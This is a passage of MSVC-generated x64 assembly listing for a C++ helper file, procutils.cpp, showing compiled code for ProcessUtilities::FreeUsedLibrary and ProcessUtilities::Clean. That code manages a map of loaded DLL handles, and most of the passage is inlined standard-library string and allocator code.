; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rsi]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN768@FreeUsedLi

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN765@FreeUsedLi

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN768@FreeUsedLi:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN754@FreeUsedLi:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 97   : 	return TRUE;

	mov	eax, 1
$LN816@FreeUsedLi:

; 98   : }

	mov	BYTE PTR [rsi], 0
	mov	QWORD PTR [rsi+24], 15
	mov	QWORD PTR [rsi+16], 0
	mov	rcx, QWORD PTR __$ArrayPad$[rbp-169]
	xor	rcx, rsp
	call	__security_check_cookie
	lea	r11, QWORD PTR [rsp+224]
	mov	rbx, QWORD PTR [r11+56]
	mov	rsi, QWORD PTR [r11+64]
	mov	rdi, QWORD PTR [r11+72]
	mov	rsp, r11
	pop	r15
	pop	r14
	pop	r13
	pop	r12
	pop	rbp
	ret	0
$LN827@FreeUsedLi:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN765@FreeUsedLi:
	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN823@FreeUsedLi:
	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN824@FreeUsedLi:
	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN825@FreeUsedLi:
	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN826@FreeUsedLi:
	call	_invalid_parameter_noinfo_noreturn
	npad	1
$LN691@FreeUsedLi:
	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN814@FreeUsedLi:
?FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ENDP ; ProcessUtilities::FreeUsedLibrary
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A$1 = 32
$T2 = 40
$T3 = 40
$T4 = 40
$T5 = 72
$T6 = 104
$T7 = 136
$T8 = 168
$T9 = 168
$T10 = 168
lib$GSCopy$ = 200
__$ArrayPad$ = 208
lib$ = 272
?dtor$0@?0??FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::FreeUsedLibrary'::`1'::dtor$0
	mov	rcx, QWORD PTR lib$GSCopy$[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$0@?0??FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::FreeUsedLibrary'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A$1 = 32
$T2 = 40
$T3 = 40
$T4 = 40
$T5 = 72
$T6 = 104
$T7 = 136
$T8 = 168
$T9 = 168
$T10 = 168
lib$GSCopy$ = 200
__$ArrayPad$ = 208
lib$ = 272
?dtor$2@?0??FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::FreeUsedLibrary'::`1'::dtor$2
	lea	rcx, QWORD PTR $T4[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$2@?0??FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::FreeUsedLibrary'::`1'::dtor$2
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A$1 = 32
$T2 = 40
$T3 = 40
$T4 = 40
$T5 = 72
$T6 = 104
$T7 = 136
$T8 = 168
$T9 = 168
$T10 = 168
lib$GSCopy$ = 200
__$ArrayPad$ = 208
lib$ = 272
?dtor$5@?0??FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::FreeUsedLibrary'::`1'::dtor$5
	lea	rcx, QWORD PTR $T3[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$5@?0??FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::FreeUsedLibrary'::`1'::dtor$5
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A$1 = 32
$T2 = 40
$T3 = 40
$T4 = 40
$T5 = 72
$T6 = 104
$T7 = 136
$T8 = 168
$T9 = 168
$T10 = 168
lib$GSCopy$ = 200
__$ArrayPad$ = 208
lib$ = 272
?dtor$8@?0??FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA PROC ; `ProcessUtilities::FreeUsedLibrary'::`1'::dtor$8
	lea	rcx, QWORD PTR $T2[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$8@?0??FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@4HA ENDP ; `ProcessUtilities::FreeUsedLibrary'::`1'::dtor$8
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ?Clean@ProcessUtilities@@YAHXZ
_TEXT	SEGMENT
$T1 = 32
$T2 = 32
$T3 = 64
$T4 = 64
?Clean@ProcessUtilities@@YAHXZ PROC			; ProcessUtilities::Clean, COMDAT

; 114  : BOOL ProcessUtilities::Clean() {

$LN377:
	mov	QWORD PTR [rsp+16], rbx
	mov	QWORD PTR [rsp+24], rsi
	mov	QWORD PTR [rsp+32], rdi
	push	rbp
	push	r12
	push	r13
	push	r14
	push	r15
	mov	rbp, rsp
	sub	rsp, 96					; 00000060H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	rdi, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
	mov	rbx, QWORD PTR [rdi]
	cmp	rbx, rdi
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 115  : 	for ( auto& libInfo : _loadedLibs )

	je	$LN3@Clean
	mov	r13, 9223372036854775807		; 7fffffffffffffffH
$LN374@Clean:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2509 :         _Construct<_Construct_strategy::_From_string>(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

	mov	r14, QWORD PTR [rbx+32]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 42   :         return _Ptr->_Myval;

	lea	r12, QWORD PTR [rbx+16]
	xor	edx, edx
	xorps	xmm0, xmm0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [r12+24], 15
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 42   :         return _Ptr->_Myval;

	mov	r8d, 22
	mov	rcx, -9223372036854775808		; 8000000000000000H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2308 :     size_type _Mysize = 0; // current length of string (size)

	mov	QWORD PTR $T2[rbp-80], rdx

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

	movups	XMMWORD PTR $T2[rbp-96], xmm0

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

	mov	QWORD PTR $T2[rbp-72], rdx

; 2235 :         const value_type* _Result = _Bx._Buf;

	mov	r15, r12

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN343@Clean

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r15, QWORD PTR [r12]
$LN343@Clean:

; 2672 :         if (_Count > max_size()) {

	cmp	r14, r13
	ja	$LN305@Clean

; 2674 :         }
; 2675 : 
; 2676 :         auto& _Al       = _Getal();
; 2677 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);
; 2678 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 2679 : 
; 2680 :         if (_Count <= _Small_string_capacity) {

	cmp	r14, 15
	ja	SHORT $LN50@Clean

; 2681 :             _My_data._Mysize = _Count;

	mov	QWORD PTR $T2[rbp-80], r14

; 2682 :             _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR $T2[rbp-72], 15

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	movups	xmm0, XMMWORD PTR [r15]
	movups	XMMWORD PTR $T2[rbp-96], xmm0

; 2699 :             return;

	jmp	$LN107@Clean
$LN50@Clean:

; 4763 :         const size_type _Masked = _Requested | _Alloc_mask;

	mov	rsi, r14
	or	rsi, 15
	cmp	rsi, r13

; 4764 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

	jbe	SHORT $LN60@Clean

; 4765 :             return _Max;

	mov	rsi, r13
	lea	rax, QWORD PTR [rcx+39]
	jmp	SHORT $LN347@Clean
$LN60@Clean:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 74   :     return _Left < _Right ? _Right : _Left;

	cmp	rsi, 22
	cmovb	rsi, r8
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2616 :         ++_Capacity; // Take null terminator into consideration

	lea	rcx, QWORD PTR [rsi+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 196  :     if (_Bytes == 0) {

	test	rcx, rcx
	jne	SHORT $LN78@Clean

; 197  :         return nullptr;

	mov	rax, rdx
	jmp	SHORT $LN77@Clean
$LN78@Clean:

; 198  :     }
; 199  : 
; 200  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 201  :     if (_STD is_constant_evaluated()) {
; 202  :         return _Traits::_Allocate(_Bytes);
; 203  :     }
; 204  : #endif // _HAS_CXX20
; 205  : 
; 206  : #ifdef __cpp_aligned_new
; 207  :     if constexpr (_Align > __STDCPP_DEFAULT_NEW_ALIGNMENT__) {
; 208  :         size_t _Passed_align = _Align;
; 209  : #if defined(_M_IX86) || defined(_M_X64)
; 210  :         if (_Bytes >= _Big_allocation_threshold) {
; 211  :             // boost the alignment of big allocations to help autovectorization
; 212  :             _Passed_align = (_STD max)(_Align, _Big_allocation_alignment);
; 213  :         }
; 214  : #endif // defined(_M_IX86) || defined(_M_X64)
; 215  :         return _Traits::_Allocate_aligned(_Bytes, _Passed_align);
; 216  :     } else
; 217  : #endif // defined(__cpp_aligned_new)
; 218  :     {
; 219  : #if defined(_M_IX86) || defined(_M_X64)
; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rcx, 4096				; 00001000H
	jb	SHORT $LN80@Clean

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rax, QWORD PTR [rcx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rax, rcx
	jbe	$LN306@Clean
$LN347@Clean:

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rax
	call	??2@YAPEAX_K@Z				; operator new
	mov	rcx, rax

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	$LN164@Clean

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	add	rax, 39					; 00000027H
	and	rax, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rax-8], rcx

; 222  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

	jmp	SHORT $LN77@Clean
$LN80@Clean:

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new
$LN77@Clean:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2715 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count + 1);

	lea	r8, QWORD PTR [r14+1]
	mov	QWORD PTR $T2[rbp-96], rax

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	mov	rdx, r15

; 2706 :         _My_data._Mysize = _Count;

	mov	QWORD PTR $T2[rbp-80], r14

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	mov	rcx, rax

; 2707 :         _My_data._Myres  = _New_capacity;

	mov	QWORD PTR $T2[rbp-72], rsi

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	call	memcpy
$LN107@Clean:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 117  : 		if ( strcmp(_lower(libInfo.first).c_str(), freqDLLS::kernel32.c_str()) != 0 )

	lea	rdx, QWORD PTR $T2[rbp-96]
	lea	rcx, QWORD PTR $T4[rbp-96]
	call	?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z ; ProcessUtilities::_lower
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR ?kernel32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B+24, 15

; 2236 :         if (_Large_mode_engaged()) {

	lea	rdx, OFFSET FLAT:?kernel32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
	cmova	rdx, QWORD PTR ?kernel32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rax+24], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN130@Clean

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rax, QWORD PTR [rax]
$LN130@Clean:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 117  : 		if ( strcmp(_lower(libInfo.first).c_str(), freqDLLS::kernel32.c_str()) != 0 )

	sub	rdx, rax
$LL349@Clean:
	movzx	esi, BYTE PTR [rax]
	movzx	ecx, BYTE PTR [rax+rdx]
	sub	esi, ecx
	jne	SHORT $LN350@Clean
	inc	rax
	test	ecx, ecx
	jne	SHORT $LL349@Clean
$LN350@Clean:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR $T4[rbp-72]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN153@Clean
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR $T4[rbp-96]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rax, rcx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN167@Clean

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H
	sub	rax, rcx

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;
; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	$LN164@Clean
$LN167@Clean:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN153@Clean:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 117  : 		if ( strcmp(_lower(libInfo.first).c_str(), freqDLLS::kernel32.c_str()) != 0 )

	test	esi, esi
	je	$LN2@Clean
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [r12+24], 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN342@Clean

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r12, QWORD PTR [r12]
$LN342@Clean:

; 2308 :     size_type _Mysize = 0; // current length of string (size)

	xor	r15d, r15d
	xorps	xmm0, xmm0

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

	movups	XMMWORD PTR $T1[rbp-96], xmm0

; 2308 :     size_type _Mysize = 0; // current length of string (size)

	mov	QWORD PTR $T1[rbp-80], r15

; 398  :             return __builtin_strlen(_First);

	mov	rsi, -1

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

	mov	QWORD PTR $T1[rbp-72], r15
	npad	6
$LL348@Clean:

; 398  :             return __builtin_strlen(_First);

	inc	rsi
	cmp	BYTE PTR [r12+rsi], r15b
	jne	SHORT $LL348@Clean

; 2672 :         if (_Count > max_size()) {

	cmp	rsi, r13
	ja	$LN307@Clean

; 2674 :         }
; 2675 : 
; 2676 :         auto& _Al       = _Getal();
; 2677 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);
; 2678 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 2679 : 
; 2680 :         if (_Count <= _Small_string_capacity) {

	cmp	rsi, 15
	ja	SHORT $LN203@Clean

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	mov	r8, rsi

; 2681 :             _My_data._Mysize = _Count;

	mov	QWORD PTR $T1[rbp-80], rsi

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	mov	rdx, r12

; 2682 :             _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR $T1[rbp-72], 15

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

	lea	rcx, QWORD PTR $T1[rbp-96]
	call	memcpy

; 2689 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());

	mov	BYTE PTR $T1[rbp+rsi-96], r15b

; 2690 :             } else { // _Strat == _Construct_strategy::_From_string
; 2691 : #ifdef _INSERT_STRING_ANNOTATION
; 2692 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count + 1);
; 2693 : #else // ^^^ _INSERT_STRING_ANNOTATION / !_INSERT_STRING_ANNOTATION vvv
; 2694 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _BUF_SIZE);
; 2695 : #endif // ^^^ !_INSERT_STRING_ANNOTATION ^^^
; 2696 :             }
; 2697 : 
; 2698 :             _Proxy._Release();
; 2699 :             return;

	jmp	$LN201@Clean
$LN203@Clean:

; 4763 :         const size_type _Masked = _Requested | _Alloc_mask;

	mov	r14, rsi
	or	r14, 15
	cmp	r14, r13

; 4764 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

	jbe	SHORT $LN213@Clean

; 4765 :             return _Max;

	mov	rax, -9223372036854775808		; 8000000000000000H
	mov	r14, r13
	add	rax, 39					; 00000027H
	jmp	SHORT $LN346@Clean
$LN213@Clean:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 74   :     return _Left < _Right ? _Right : _Left;

	cmp	r14, 22
	mov	eax, 22
	cmovb	r14, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2616 :         ++_Capacity; // Take null terminator into consideration

	lea	rcx, QWORD PTR [r14+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 196  :     if (_Bytes == 0) {

	test	rcx, rcx
	je	SHORT $LN230@Clean

; 198  :     }
; 199  : 
; 200  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 201  :     if (_STD is_constant_evaluated()) {
; 202  :         return _Traits::_Allocate(_Bytes);
; 203  :     }
; 204  : #endif // _HAS_CXX20
; 205  : 
; 206  : #ifdef __cpp_aligned_new
